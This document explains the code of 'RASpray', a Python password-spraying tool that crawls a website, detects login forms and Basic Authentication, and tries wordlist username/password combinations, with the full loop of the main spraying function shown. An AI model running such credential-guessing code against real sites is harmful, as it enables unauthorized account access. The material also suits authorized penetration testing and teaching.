### RASpray Codebase Explanation

This document provides a detailed explanation of the structure, logic, and reasoning behind each component of the **RASpray** password spraying tool. The code is designed to automate password spraying attacks on websites, identifying both form-based and Basic Authentication vulnerabilities. Here’s an explanation of why everything is designed the way it is:

---

#### 1. **Header Information & Import Statements**

```python
#!/usr/bin/env python3
import sys
import re
import requests
from bs4 import BeautifulSoup
from requests.auth import HTTPBasicAuth
from requests.exceptions import RequestException, Timeout, ConnectionError
from urllib.parse import urljoin
```

- **Shebang (`#!/usr/bin/env python3`)**: This line is to make sure that the script is executed using Python 3, making it compatible with systems that support Python.
  
- **Imports**:
  - `sys`: Used for handling command-line arguments and interacting with the system.
  - `re`: Regular expressions for pattern matching (e.g., filtering usernames and passwords).
  - `requests`: Simplifies HTTP requests (GET, POST) for interacting with websites.
  - `BeautifulSoup` (from `bs4`): Used to parse HTML content and extract form fields.
  - `HTTPBasicAuth`: Provides support for handling HTTP Basic Authentication.
  - `RequestException`, `Timeout`, `ConnectionError`: Specialized exception handling for different HTTP request errors.
  - `urljoin`: Safely concatenate URLs, ensuring consistency with relative paths.

---

#### 2. **TOOL_NAME and VERSION**

```python
TOOL_NAME = "RASpray"
VERSION = "1.0.0"
```

- **Purpose**: These constants define the name of the tool and its current version. This allows users to know what tool they are using and check the version for future updates or support.

---

#### 3. **Banner Display Function**

```python
def display_banner():
    banner = r"""
    
    ██████╗  █████╗     ███████╗██████╗ ██████╗  █████╗ ██╗   ██╗
    ██╔══██╗██╔══██╗    ██╔════╝██╔══██╗██╔══██╗██╔══██╗╚██╗ ██╔╝
    ██████╔╝███████║    ███████╗██████╔╝██████╔╝███████║ ╚████╔╝ 
    ██╔══██╗██╔══██║    ╚════██║██╔═══╝ ██╔══██╗██╔══██║  ╚██╔╝  
    ██║  ██║██║  ██║    ███████║██║     ██║  ██║██║  ██║   ██║   
    ╚═╝  ╚═╝╚═╝  ╚═╝    ╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   
                                                             
    Version: 1.0.0
    """
    print(banner)
```

- **Purpose**: Displays a visually appealing banner to users. Provides the tool name and version in a fun, ASCII art format.

---

#### 4. **Help and Version Display Functions**

```python
def display_help():
    # Displays a help message with tool usage and options.
```

- **Purpose**: Provides users with a clear set of instructions on how to use the tool.

```python
def display_version():
    # Displays the tool version to the user.
```

- **Purpose**: Displays the current version of the tool when the user passes the `--version` argument.

---

#### 5. **Traversing the Website**

```python
def traverse_website(base_url, session, max_depth=3):
    # Traverses the website starting from the base URL and follows links up to a depth limit.
```

- **Purpose**: This function performs a depth-limited crawl through a website, collecting URLs up to a certain depth. The depth limit prevents the tool from entering infinite loops or traversing too deeply.
  
- **Why `BeautifulSoup`?**: `BeautifulSoup` is used to parse the HTML and extract `<a>` tags (links) from each page.
  
- **Why `urljoin`?**: This makes sure that relative links are converted to full URLs when appended to the base URL.

---

#### 6. **Checking for Basic Authentication and Password Fields**

```python
def is_password_requested_basic_auth(url, session):
    # Checks if a page is protected by Basic Authentication (HTTP 401).
```

- **Purpose**: This function sends a `HEAD` request to a page to check if it is protected by Basic Authentication. It helps the tool identify pages requiring username/password credentials in the HTTP header.

```python
def is_password_requested_basic_password_field(url, session):
    # Checks if a page has a form with a password field.
```

- **Purpose**: This function checks if a page has a password field in its HTML form. It helps the tool identify login forms where credentials need to be submitted via POST.

---

#### 7. **Filtering Usernames/Passwords by Criteria**

```python
def filter_by_criteria(items, min_len=None, max_len=None, uppercase=False, lowercase=False, numbers=False, special_chars=False):
    # Filters a list of usernames or passwords based on specified criteria.
```

- **Purpose**: This function filters usernames or passwords based on user-specified rules(min/max, required chars, etc.).
  
- **Why `re.search`?**: Regular expressions allows for precise pattern matching for the characters above.

---

#### 8. **Extracting Form Fields from HTML**

```python
def extract_form_fields(soup):
    # Extracts all form fields from the login page.
```

- **Purpose**: This function extracts all input fields from an HTML form, allowing the tool to dynamically fill out login forms with usernames and passwords. It looks for `<input>` elements and captures their `name` and `value` attributes.

---

#### 9. **Form-Based Login Attempt**

```python
def attempt_login_with_form(full_url, session, username, password):
    # Attempts to log in by submitting the form with the username and password.
```

- **Purpose**: This function attempts to log in to a page by submitting a form using POST. It then dynamically proceeds to fill the form’s username and password fields, checks for any redirects, and handles Basic Authentication if the redirect URL contains credentials.

- **Why `allow_redirects=False`?**: Disabling automatic redirects allows the tool to manually inspect redirect URLs, which may contain login credentials.

---

#### 10. **Password Spraying Logic**

```python
def password_spraying(ip_address, username_file, password_file, criteria):
    # Performs password spraying on pages where password fields or BasicAuth are found.
```

- **Purpose**: The core functionality of the tool. It reads usernames and passwords from files, filters them according to criteria, and attempts each combination on identified login pages.
  
- **Flow**:
  1. **File Reading**: Opens and reads username/password files.
  2. **Filtering**: Filters the lists based on user-specified criteria.
  3. **Session Persistence**: A session is created to maintain cookies across multiple requests.
  4. **Page Traversal**: The tool uses `traverse_website` to discover pages with password fields or BasicAuth.
  5. **Login Attempts**: It attempts login via form submission and retries with BasicAuth credentials if needed.

---

#### 11. **Checking for Login Form**

```python
def is_login_form_present(html_content):
    # Checks if a given page contains a login form with username/password fields.
```

- **Purpose**: A helper function that inspects the HTML of a page and checks if both username and password fields are present. It helps the tool confirm that the page is indeed a login form.

---

#### 12. **Main Function**

```python
def main():
    # The main function that parses command-line arguments and initiates the password spraying process.
```

- **Purpose**: The entry point of the tool. It parses command-line arguments (e.g., username file, password file, IP address), displays the banner, and starts the password spraying process.

- **Why `sys.argv`?**: It captures command-line arguments, allowing users to specify options for running the tool (e.g., `-u` for username file, `-p` for password file).

---

======== 10/07/24 Updates ========

### Updated Detailed Code Explanation

This explanation reflects the updated RASpray tool made on 10/07/24, which now includes color output for success and failure messages, prints the banner in red, and provides a summary of cracking attempts at the end of execution.

---

#### 1. **Header Information & Import Statements**

```python
#!/usr/bin/env python3
import sys
import re
import requests
from bs4 import BeautifulSoup
from requests.auth import HTTPBasicAuth
from requests.exceptions import RequestException, Timeout, ConnectionError
from urllib.parse import urljoin
from colorama import Fore, Style, init
```

- **Shebang (`#!/usr/bin/env python3`)**: This ensures the script runs using Python 3.
  
- **Imports**:
  - `sys`: Handles command-line arguments.
  - `re`: Provides regular expression matching for filtering usernames and passwords.
  - `requests`: Used for making HTTP requests.
  - `BeautifulSoup`: Parses HTML to extract form fields.
  - `HTTPBasicAuth`: Handles Basic Authentication.
  - `RequestException`, `Timeout`, `ConnectionError`: Handle various request errors.
  - `urljoin`: Ensures proper URL concatenation.
  - `colorama`: Adds color output to the terminal, allowing the tool to display success/failure messages and the banner in color.


---

#### 2. **Displaying the RASpray Banner**

```python
def display_banner():
    banner = r"""
    
    ██████╗  █████╗     ███████╗██████╗ ██████╗  █████╗ ██╗   ██╗
    ██╔══██╗██╔══██╗    ██╔════╝██╔══██╗██╔══██╗██╔══██╗╚██╗ ██╔╝
    ██████╔╝███████║    ███████╗██████╔╝██████╔╝███████║ ╚████╔╝ 
    ██╔══██╗██╔══██║    ╚════██║██╔═══╝ ██╔══██╗██╔══██║  ╚██╔╝  
    ██║  ██║██║  ██║    ███████║██║     ██║  ██║██║  ██║   ██║   
    ╚═╝  ╚═╝╚═╝  ╚═╝    ╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   
                                                             
    Version: 1.0.0
    """
    print(f"{Fore.RED}{banner}{Style.RESET_ALL}")
```

- **Purpose**: Displays the tool's banner in red using `colorama`'s `Fore.RED` feature. The banner includes the tool's name and version in an ASCII-art format.

---

#### 3. **Password Spraying Logic**

```python
def password_spraying(ip_address, username_file, password_file, criteria):
    successful_cracks = []
    failed_cracks = []

    with open(username_file, 'r') as

 user_file:
        usernames = [line.strip() for line in user_file.readlines()]
    
    with open(password_file, 'r') as pass_file:
        passwords = [line.strip() for line in pass_file.readlines()]

    usernames = filter_by_criteria(usernames, **criteria)
    passwords = filter_by_criteria(passwords, **criteria)
    
    session = requests.Session()
    base_url = f'http://{ip_address}'
    pages_to_check = traverse_website(base_url, session)
    
    for page in pages_to_check:
        full_url = urljoin(base_url, page)

        if is_password_requested_basic_password_field(full_url, session):
            for username in usernames:
                for password in passwords:
                    try:
                        credentials = attempt_login_with_form(full_url, session, username, password)
                        
                        if credentials:
                            auth_response = session.get(full_url, auth=HTTPBasicAuth(credentials[0], credentials[1]))

                            if auth_response.status_code == 200:
                                print(f"{Fore.GREEN}Success! Username: {credentials[0]}, Password: {credentials[1]} on {full_url}")
                                successful_cracks.append((full_url, credentials[0], credentials[1]))
                            else:
                                print(f"{Fore.RED}Failed BasicAuth for Username: {credentials[0]} on {full_url}")
                                failed_cracks.append(full_url)
                    except (Timeout, ConnectionError):
                        print(f"Connection failed for {full_url}")
                    except RequestException as e:
                        print(f"An error occurred: {e}")
    
    print("\n--- Summary of Cracking Attempts ---")
    if successful_cracks:
        print(f"{Fore.GREEN}Successfully cracked pages:")
        for page, user, pwd in successful_cracks:
            print(f"Page: {page}, Username: {user}, Password: {pwd}")
    else:
        print(f"{Fore.RED}No successful cracking attempts.")
    
    if failed_cracks:
        print(f"{Fore.RED}Failed pages that required a password:")
        for page in failed_cracks:
            print(f"Page: {page}")
    else:
        print(f"{Fore.GREEN}No failed password cracking attempts.")
```

- **Purpose**: Executes the password spraying attack:
  - Filters usernames and passwords.
  - Attempts login via form submission.
  - Handles Basic Authentication.
  - Provides colorized feedback for successes (green) and failures (red).
  - Summarizes all successful and failed cracking attempts at the end.

---
```
======== END OF UPDATES MADE ON 10/07/23 ========

